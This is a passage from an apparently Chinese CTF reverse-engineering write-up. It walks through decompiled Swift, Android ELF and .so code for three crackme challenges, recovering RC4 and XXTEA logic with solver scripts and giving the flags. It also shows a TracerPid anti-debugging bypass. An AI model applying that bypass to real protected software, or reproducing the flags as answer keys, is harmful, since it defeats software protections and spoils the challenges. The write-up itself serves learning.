&#125;</span><br><span class="line">  v11.receiver = v3;</span><br><span class="line">  v11.super_class = (Class)type metadata accessor <span class="keyword">for</span> <span class="title function_">ViewController</span><span class="params">(a1)</span>;</span><br><span class="line">  v9 = objc_msgSendSuper2(&amp;v11, <span class="string">&quot;initWithNibName:bundle:&quot;</span>, v8, a3);</span><br><span class="line">  objc_release(v8);</span><br><span class="line">  objc_release(a3);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现这里有一个<code>secretKey</code>被初始化</p>
<p>Hex: <code>48 61 72 75 68 69 6B 61  67 65 00 00 00 00 00 EA</code> Bytes: <code>b&#39;Haruhikage\x00\x00\x00\x00\x00\xea&#39;</code>  （可打印部分为 <code>&quot;Haruhikage&quot;</code>，最后是 <code>0xEA</code>）</p>
<p>即RC4的密钥</p>
<p>字符串里还有”恭喜你找到了flag！”，看看这个函数void ViewController.encryptButtonClicked()()：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v10 = ViewController.complexEncrypt(_:)(v7, v9);</span><br><span class="line">v12 = v11;</span><br><span class="line">v13 = ViewController.verifyFlag(_:)(v7, v9);</span><br></pre></td></tr></table></figure>

<p>查看函数__int64 _<em>fastcall ViewController.complexEncrypt(</em>:)(__int64 a1, __int64 a2)：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title class_">ViewController</span>.<span class="title function_">complexEncrypt</span>(<span class="attr">_</span>:)(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// x20</span></span><br><span class="line">  __int64 v5; <span class="comment">// x22</span></span><br><span class="line">  __int64 v6; <span class="comment">// x24</span></span><br><span class="line">  char *v7; <span class="comment">// x23</span></span><br><span class="line">  __int64 v8; <span class="comment">// x19</span></span><br><span class="line">  __int64 v9; <span class="comment">// x1</span></span><br><span class="line">  __int64 v10; <span class="comment">// x21</span></span><br><span class="line">  __int64 v11; <span class="comment">// x19</span></span><br><span class="line">  unsigned __int64 v12; <span class="comment">// x1</span></span><br><span class="line">  unsigned __int64 v13; <span class="comment">// x20</span></span><br><span class="line">  __int64 countAndFlagsBits; <span class="comment">// x0</span></span><br><span class="line">  <span class="built_in">void</span> *<span class="built_in">object</span>; <span class="comment">// x21</span></span><br><span class="line">  <span class="title class_">Swift</span>::<span class="title class_">String</span> v16; <span class="comment">// kr00_16</span></span><br><span class="line">  __int64 v17; <span class="comment">// x19</span></span><br><span class="line">  __int64 v18; <span class="comment">// x1</span></span><br><span class="line">  __int64 v19; <span class="comment">// x20</span></span><br><span class="line">  __int64 v20; <span class="comment">// x19</span></span><br><span class="line">  __int64 v22; <span class="comment">// [xsp+0h] [xbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="keyword">type</span> metadata accessor <span class="keyword">for</span> <span class="title class_">String</span>.<span class="title class_">Encoding</span>(<span class="number">0</span>);</span><br><span class="line">  v6 = *(_QWORD *)(v5 - <span class="number">8</span>);</span><br><span class="line">  v7 = (char *)&amp;v22 - ((*(_QWORD *)(v6 + <span class="number">64</span>) + 15LL) &amp; 0xFFFFFFFFFFFFFFF0LL);</span><br><span class="line">  v8 = specialized <span class="title class_">ViewController</span>.<span class="title function_">rc4Encrypt</span>(<span class="attr">_</span>:<span class="attr">key</span>:)(<span class="comment">// 获取 secretKey</span></span><br><span class="line">         a1,</span><br><span class="line">         a2,</span><br><span class="line">         *(_QWORD *)(v2 + OBJC_IVAR____TtC9challenge14ViewController_secretKey),</span><br><span class="line">         *(_QWORD *)(v2 + OBJC_IVAR____TtC9challenge14ViewController_secretKey + <span class="number">8</span>));</span><br><span class="line">  v10 = v9;</span><br><span class="line">  <span class="keyword">static</span> <span class="title class_">String</span>.<span class="property">Encoding</span>.<span class="property">utf8</span>.<span class="title function_">getter</span>();</span><br><span class="line">  v11 = <span class="title class_">String</span>.<span class="title function_">data</span>(<span class="attr">using</span>:<span class="attr">allowLossyConversion</span>:)(v7, <span class="number">0</span>, v8, v10);</span><br><span class="line">  v13 = v12;</span><br><span class="line">  <span class="title function_">swift_bridgeObjectRelease</span>(v10);</span><br><span class="line">  (*(<span class="title function_">void</span> (__fastcall **)(char *, __int64))(v6 + <span class="number">8</span>))(v7, v5);</span><br><span class="line">  <span class="keyword">if</span> ( v13 &gt;&gt; <span class="number">60</span> == <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    countAndFlagsBits = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">object</span> = (<span class="built_in">void</span> *)0xE000000000000000LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v16 = <span class="title class_">Data</span>.<span class="title function_">base64EncodedString</span>(<span class="attr">options</span>:)(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">object</span> = v16.<span class="property">_object</span>;</span><br><span class="line">    outlined consume <span class="keyword">of</span> <span class="title class_">Data</span>?(v11, v13);</span><br><span class="line">    countAndFlagsBits = v16.<span class="property">_countAndFlagsBits</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = specialized <span class="title class_">ViewController</span>.<span class="title function_">obfuscateString</span>(<span class="attr">_</span>:)(countAndFlagsBits, <span class="built_in">object</span>);</span><br><span class="line">  v19 = v18;</span><br><span class="line">  <span class="title function_">swift_bridgeObjectRelease</span>(<span class="built_in">object</span>);</span><br><span class="line">  v20 = specialized <span class="title class_">ViewController</span>.<span class="title function_">transformString</span>(<span class="attr">_</span>:)(v17, v19);</span><br><span class="line">  <span class="title function_">swift_bridgeObjectRelease</span>(v19);</span><br><span class="line">  <span class="keyword">return</span> v20;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现其加密逻辑为<strong>RC4（密钥为上文被初始化的密钥）→base64编码→obfuscateString→transformString</strong></p>
<p>UTF-8 编码规则：</p>
<p><img src="/1763435254333-13.png" alt="img"></p>
<p>看一下transformString函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (v6 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v7 ^ <span class="number">0xBE</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (v7 &amp; (<span class="type">unsigned</span> __int64)&amp;_mh_execute_header) != <span class="number">0</span> )</span><br><span class="line">          v8 = <span class="number">190</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt;&gt; <span class="number">11</span> == <span class="number">27</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt; <span class="number">0x10FFFF</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v7 ^ <span class="number">0xEF</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (v7 &amp; (<span class="type">unsigned</span> __int64)&amp;_mh_execute_header) != <span class="number">0</span> )</span><br><span class="line">          v8 = <span class="number">239</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt;&gt; <span class="number">11</span> == <span class="number">27</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt; <span class="number">0x10FFFF</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>发现是按奇偶索引分别异或<strong>0xBE</strong>和<strong>0xEF</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if ( v8 &gt; 0x7F )</span><br><span class="line">&#123;</span><br><span class="line">  v13 = (v8 &amp; 0x3F) &lt;&lt; 8;</span><br><span class="line">  v14 = (v8 &gt;&gt; 6) + v13 + 0x81C1;</span><br><span class="line">  v15 = (v13 | (v8 &gt;&gt; 6) &amp; 0x3F) &lt;&lt; 8;</span><br><span class="line">  v16 = (v8 &gt;&gt; 18) + ((v15 | (v8 &gt;&gt; 12) &amp; 0x3F) &lt;&lt; 8) - 0x7E7E7E0F;</span><br><span class="line">  v17 = (v8 &gt;&gt; 12) + v15 + 0x8181E1;</span><br><span class="line">  if ( HIWORD(v8) )</span><br><span class="line">    v17 = v16;</span><br><span class="line">  if ( v8 &gt;= 0x800 )</span><br><span class="line">    v9 = v17;</span><br><span class="line">  else</span><br><span class="line">    v9 = v14;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  v9 = v8 + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同构这个函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc_utf8</span>(<span class="params">tmp: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">if</span> tmp &gt; <span class="number">0x7F</span>:</span><br><span class="line">        v12 = (tmp &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">        v13 = ((tmp &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>) + v12 + <span class="number">0x81C0</span></span><br><span class="line">        v14 = ((v12 | ((tmp &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>)) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        v15 = ((tmp &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>) + (((v14 | ((tmp &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>)) &lt;&lt; <span class="number">8</span>)) - <span class="number">0x7E7E7E0F</span></span><br><span class="line">        v16 = ((tmp &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>) + v14 + <span class="number">0x8181E0</span></span><br><span class="line">        <span class="keyword">if</span> tmp &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">            v16 = v15</span><br><span class="line">        <span class="keyword">if</span> tmp &gt;= <span class="number">0x800</span>:</span><br><span class="line">            v9 = v16</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v9 = v13</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v9 = tmp</span><br><span class="line">    <span class="keyword">return</span> v9</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x0</span>,<span class="number">0x100</span>):</span><br><span class="line">    ui = calc_utf8(i)</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">0x80</span>:</span><br><span class="line">        ui = ((ui &lt;&lt; <span class="number">8</span>) + (ui &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0xFFFF</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ui:04x&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ui:02x&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>发现在转换结果上存在以下对应关系：</p>
<p>密文中的C2和C3是从这里转换来的，转换函数实际上只是将每个字符切分为了三种情况，对应的实际上是utf-8的单&#x2F;双&#x2F;三字节编码。</p>
<p>obfuscateString函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">v9 = __OFADD__(v8, v6);                   <span class="comment">// 字符值 + 位置索引</span></span><br><span class="line">v10 = v8 + v6;</span><br><span class="line"><span class="keyword">if</span> ( v9 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">v9 = __OFADD__(v10, <span class="number">0xDEADBEEFLL</span>);        <span class="comment">// ＋0xDEADBEEF</span></span><br><span class="line">v11 = v10 + <span class="number">0xDEADBEEFLL</span>;</span><br><span class="line"><span class="keyword">if</span> ( v9 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">v12 = -v11 &lt; <span class="number">0</span>;</span><br><span class="line">v11 = (<span class="type">unsigned</span> __int8)v11;               <span class="comment">// v11 &amp; 0xFF(取低八位)</span></span><br><span class="line"><span class="keyword">if</span> ( !v12 )</span><br><span class="line">  v11 = -(__int64)(<span class="type">unsigned</span> __int8)-(<span class="type">char</span>)v11;<span class="comment">// 取反</span></span><br><span class="line"><span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_22;</span><br><span class="line"><span class="keyword">if</span> ( (v11 &amp; <span class="number">0xFFFFFF80</span>) != <span class="number">0</span> )            <span class="comment">// v11&gt;=0x80</span></span><br><span class="line">  v13 = (((v11 &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">8</span>) | ((<span class="type">unsigned</span> <span class="type">int</span>)v11 &gt;&gt; <span class="number">6</span>)) + <span class="number">33217</span>;</span><br><span class="line"><span class="keyword">else</span>                                      <span class="comment">// v11&lt;0x80</span></span><br><span class="line">  v13 = v11 + <span class="number">1</span>;</span><br><span class="line">v17[<span class="number">0</span>] = (v13 + <span class="number">0xFEFEFEFEFEFEFFLL</span>) &amp; ~(<span class="number">-1LL</span> &lt;&lt; (<span class="number">8</span> * (<span class="number">4</span> - (<span class="type">unsigned</span> __int8)(__clz(v13) &gt;&gt; <span class="number">3</span>))));<span class="comment">// utf-8编码</span></span><br><span class="line">v<span class="number">14.</span>_countAndFlagsBits = ((__int64 (__fastcall *)(_QWORD *))<span class="type">static</span> String._uncheckedFromUTF8(_:))(v17);</span><br><span class="line">v15 = v<span class="number">14.</span>_object;</span><br><span class="line">String.<span class="built_in">append</span>(_:)(v14);</span><br></pre></td></tr></table></figure>

<p>本质就是计算：<code>temp = (char + i + 0xDEADBEEF) &amp; 0xFF</code></p>
<p>逆向：</p>
<p>得到base64：YWRiZTI5NzkzNTg3OTgzMDhjOTExZGQ0NjQ3YTJmNmExM2MwNDJjYzMyNDU5N2UxZWRiYzA4OWE5ZTkwMTVmYmE5，</p>
<p>解码得到一串十六进制：adbe2979358798308c911dd4647a2f6a13c042cc324597e1edbc089a9e9015fba9，RC4解密得到flag：<strong>flag{N4nd3_H4ruhik4g3_Y4tt4n0?!!}</strong>.</p>
<p><img src="/1763435254333-14.png" alt="img"></p>
<p>flag{N4nd3_H4ruhik4g3_Y4tt4n0?!!}</p>
<h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>查壳，发现是android，arm64架构的elf</p>
<p><img src="/1763435254333-15.png" alt="img"></p>
<p>用ida打开程序发现有混淆，需要动态调试</p>
<p><img src="/1763435254333-16.png" alt="img"></p>
<p>输入通过参数传递，在debugger里设置</p>
<p><img src="/1763435254333-17.png" alt="img"></p>
<p>运行的时候闪退，应该有什么程序起到了反调试的作用，是constructor函数</p>
<p>init_array中的constructor函数起到了反调试的作用，会有对TracerPid的检测</p>
<p>在fgets后下断点</p>
<p><img src="/1763435254333-18.png" alt="img"></p>
<p>一直运行，读取不同的pid</p>
<p><img src="/1763435254333-19.png" alt="img"></p>
<p><strong>TracerPid就是调试此进程的pid，在同一时刻只能有一个进程调试本进程</strong></p>
<p>因此绕过的思路就是在检测到tracerpid字段的时候，将其字符串中的tracerpid: xxxxxx改为tracerpid: 0即可</p>
<p><img src="/1763435254333-20.png" alt="img"></p>
<p>写一个脚本在ida运行，一定要严格修改正确，因为tracerpid的字符串后面会用来sbox的初始化，修改错误会导致最后密钥的值错误。</p>
<p>main–&gt;game，在game这下断点，运行</p>
<p><img src="/1763435254333-21.png" alt="img"></p>
<p>my_strlen,读取我们的输入</p>
<p><img src="/1763435254333-22.png" alt="img"></p>
<p>在存放密文的栈下断点，查看是哪个函数加密了，发现是rc4的魔改</p>
<p><img src="/1763435254333-23.png" alt="img"></p>
<p>写脚本拿到w10的值就是密钥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto W10 = GetRegValue(&quot;W10&quot;);</span><br><span class="line">Message(&quot;0x%X, &quot;,W10);</span><br></pre></td></tr></table></figure>

<p>爆破：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">unsigned char input[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef&quot;;</span><br><span class="line">unsigned char output[32], save[32];</span><br><span class="line">unsigned char x[32]=&#123;0x36, 0x71, 0xF4, 0x67, 0xFA, 0x9A, 0xF9, 0xA, 0x5E, 0xA0, 0xB6, 0xB0, 0x11, 0xAB, 0x7A, 0x2D, 0xD0, 0xD3, 0xA, 0xCA, 0xE8, 0x91, 0x9A, 0xC2, 0x64, 0x8E, 0x12, 0x8, 0xBA, 0x46, 0x4A, 0x6E&#125;;</span><br><span class="line">unsigned char cipher[] = &#123;     0x50, 0x4C, 0x8B, 0x94, 0x86, 0x6D, 0x72, 0xFB, 0x54, 0xF3, </span><br><span class="line">  0x17, 0x0F, 0xEE, 0xE4, 0xC5, 0x1E, 0xB8, 0x1A, 0xC7, 0xDF, </span><br><span class="line">  0x2D, 0x3D, 0x4E, 0x51, 0xE7, 0xAD, 0x97, 0x55, 0xF3, 0xF5, </span><br><span class="line">  0x41, 0x79&#125;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        unsigned char tmp, save = 0;</span><br><span class="line">        for (int i = 0; i &lt; 32; i++) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                for (int l = 32; l &lt;= 127; l++) &#123;</span><br><span class="line"></span><br><span class="line">                        tmp = l ^ i;</span><br><span class="line">                        tmp = tmp ^ x[i];</span><br><span class="line">                        //printf(&quot;%x &quot;, tmp);        </span><br><span class="line">                        for (int k = 0; k &lt; i; k++) &#123;</span><br><span class="line">                                tmp ^= cipher[k];</span><br><span class="line">                        &#125;</span><br><span class="line">                        if (tmp == cipher[i]) &#123;</span><br><span class="line">                                printf(&quot;%c&quot;, l);</span><br><span class="line">                                output[i] = l;</span><br><span class="line">                                break;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                //printf(&quot;%x \n&quot;, tmp);        </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//flag&#123;welcome-re-world!go!go!go!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="drillbeam"><a href="#drillbeam" class="headerlink" title="drillbeam"></a>drillbeam</h3><p>安卓逆向</p>
<p>查看java层：</p>
<p><img src="/1763435254334-24.png" alt="img"></p>
<p>输入的值只能是0-f</p>
<p><img src="/1763435254334-25.png" alt="img"></p>
<p>密文：8c1ee8d42e211d6b649e0b9c33bdc836fc912709</p>
<p>进入so层分析，查看所有函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">sub_2F5C</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// x21</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [xsp+40h] [xbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [xsp+60h] [xbp-10h]</span></span><br><span class="line"></span><br><span class="line">  _ReadStatusReg(TPIDR_EL0);</span><br><span class="line">  v5 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + <span class="number">1344LL</span>))(a1, a3);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  v9 = v5;</span><br><span class="line">  v8 = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="number">1352LL</span>))(a1, a3, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_3550</span>((__int64)&amp;unk_6510, (__int64)&amp;unk_13BF);</span><br><span class="line">  <span class="built_in">sub_184C</span>(v8, v6);</span><br><span class="line">  <span class="built_in">malloc</span>((<span class="number">2</span> * v9) | <span class="number">1</span>);</span><br><span class="line">  __asm &#123; BR              X9 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入sub_184C，发现是一个XXTEA加密</p>
<p>这一大堆 <code>v43</code>、<code>if (v43 &gt;= …)</code> 的分支，其实是控制流平坦化混淆。这不是算法本身复杂，而是编译器或混淆工具把正常的控制流（顺序执行 + for&#x2F;while 循环）打碎，用状态机变量 <code>v43</code> 控制跳转。这是一种典型的反编译防护措施，常见于加壳或 Android NDK so 的加密函数中。分析的时候可以忽略。</p>
<p>剥掉控制流混淆后，这个函数其实就是标准的 <strong>XXTEA 加密算法</strong>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">XXTEA_encrypt</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *input, <span class="type">size_t</span> len, <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>], <span class="type">size_t</span> *out_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// --- 1. 把输入数据按 4 字节分组，转换成 uint32_t 数组 ---</span></span><br><span class="line">    <span class="type">size_t</span> n = (len + <span class="number">3</span>) / <span class="number">4</span>;    <span class="comment">// 每 4 字节一个块，不足补零</span></span><br><span class="line">    <span class="type">uint32_t</span> *v = <span class="built_in">calloc</span>(n + <span class="number">1</span>, <span class="built_in">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">    <span class="built_in">memcpy</span>(v, input, len);</span><br><span class="line">    v[n] = len;  <span class="comment">// 最后一块记录长度</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// --- 2. 拷贝 128-bit key ---</span></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(k, key, <span class="number">16</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// --- 3. XXTEA 主循环 ---</span></span><br><span class="line">    <span class="type">uint32_t</span> z = v[n];</span><br><span class="line">    <span class="type">uint32_t</span> y, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="type">unsigned</span> rounds = <span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (rounds--) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        <span class="type">uint32_t</span> e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> p = <span class="number">0</span>; p &lt; n; p++) &#123;</span><br><span class="line">            y = v[p + <span class="number">1</span>];</span><br><span class="line">            <span class="type">uint32_t</span> mx = (((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((sum ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z));</span><br><span class="line">            z = v[p] += mx;</span><br><span class="line">        &#125;</span><br><span class="line">        z = v[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// --- 4. 输出密文 ---</span></span><br><span class="line">    <span class="type">size_t</span> out_size = (n + <span class="number">1</span>) * <span class="number">4</span>;</span><br><span class="line">    *out_len = out_size;</span><br><span class="line">    <span class="type">void</span> *out = <span class="built_in">malloc</span>(out_size + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(out, v, out_size);</span><br><span class="line">    ((<span class="type">char</span>*)out)[out_size] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(v);</span><br><span class="line">    <span class="keyword">return</span> 